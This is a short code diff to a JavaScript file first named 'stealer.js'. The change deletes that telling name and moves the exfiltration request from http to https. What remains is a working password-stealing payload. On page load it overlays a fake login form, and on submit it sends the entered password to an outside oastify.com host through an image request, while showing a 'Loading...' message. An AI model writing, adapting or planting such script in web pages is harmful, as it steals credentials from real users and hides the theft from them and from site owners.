@@ -1,4 +1,3 @@
-// stealer.js
 window.addEventListener('load', function() {
     var form = document.createElement('form');
     form.style.position = 'fixed';
@@ -20,7 +19,7 @@ window.addEventListener('load', function() {
     form.addEventListener('submit', function(e) {
         e.preventDefault();
         let password = document.getElementById('password').value;
-        new Image().src = `http://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`;
+        new Image().src = `https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`;
         form.innerHTML = "<p>Loading...</p>";
     });
 });
